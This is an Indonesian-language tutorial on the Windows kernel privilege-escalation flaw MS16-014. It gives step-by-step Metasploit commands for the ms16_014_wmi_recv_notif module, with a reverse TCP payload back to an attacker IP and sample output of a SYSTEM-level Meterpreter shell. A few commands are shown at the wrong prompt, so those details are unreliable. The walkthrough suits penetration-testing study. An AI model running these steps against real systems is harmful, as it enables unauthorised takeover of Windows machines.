# MS16-014

## A. Apa itu MS16-014?

[MS16-014](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-014) adalah kerentanan Local Privilege Escalation (LPE) pada Windows Kernel, khususnya terkait dengan manajemen Windows Task Scheduler dan komponen internal `win32k.sys`.

Kerentanan ini memungkinkan pengguna lokal dengan hak terbatas untuk menjalankan kode arbitrer di level kernel, dan mendapatkan hak akses `SYSTEM`. Ini dilakukan dengan cara mengeksploitasi kesalahan dalam validasi objek kernel dan manipulasi struktur internal.

## B. Detail Teknis:
- CVE ID: `CVE-2016-0040`
- Buletin Microsoft: `MS16-014`
- Tanggal Rilis: `9 Februari 2016`
- Tipe: Local Privilege Escalation (LPE)
- Arsitektur: `x86` dan `x64`
- Platform: `Windows`

## C. Sistem yang Rentan

Untuk melihat semua sistem yang rentan terhadap `MS16-014`, anda bisa melihatnya di dokumentasi resmi Microsoft: [https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-014#affected-software-and-vulnerability-severity-ratings](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-014#affected-software-and-vulnerability-severity-ratings)

## D. Langkah Penggunaan di Metasploit:

1. Dapatkan Akses Awal (User Biasa):

   ```
   msf6 > sessions          # Lihat sesi yang ada
   msf6 > sessions -i 1     # Masuk ke sesi dengan ID 1
   msf6 > getuid            # Melihat user saat ini
   msf6 > sysinfo           # Informasi sistem target
   ```

2. Keluar dari Sesi Meterpreter:
   
   ```
   msf6 > background
   ```

3. Gunakan Exploit MS16-014:

   ```
   msf6 > use exploit/windows/local/ms16_014_wmi_recv_notif
   ```

4. Setting Parameter Penting:

   ```
   msf6 > set SESSION <ID>
   msf6 > set PAYLOAD <PAYLOAD>
   msf6 > set LHOST <IP_ATTACKER>
   msf6 > set LPORT <PORT_LISTENER>
   msf6 > set TARGET <ID>
   msf6 > set VERBOSE true
   ```

   > Untuk ID target bisa dilihat dengan:

   ```
   msf6 > show targets
   ```

5. Jalankan Exploit:

   ```
   msf6 > exploit
   ```

   Jika hasil output-nya seperti ini:

   ```
   [*] Started reverse TCP handler on 192.168.1.42:4444 
   [*] OS Version: Windows 7 Service Pack 1
   [*] Reflectively injecting the exploit DLL and running it...
   [*] Launching msiexec to host the DLL...
   [+] Process 1276 launched.
   [*] Reflectively injecting the DLL into 1276...
   [+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
   [*] Sending stage (203846 bytes) to 192.168.1.50
   [*] Meterpreter session 20 opened (192.168.1.42:4444 -> 192.168.1.50:49179) at 2025-05-14 17:34:54 +0700

   meterpreter > 
   ```
   
   Itu artinya kita sudah mendapatkan akses tertinggi dari sistem. Untuk mengeceknya, ketikkan perintah berikut:

   ```
   meterpreter > getuid 
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > getuid 
   Server username: NT AUTHORITY\SYSTEM
   meterpreter > 
   ```
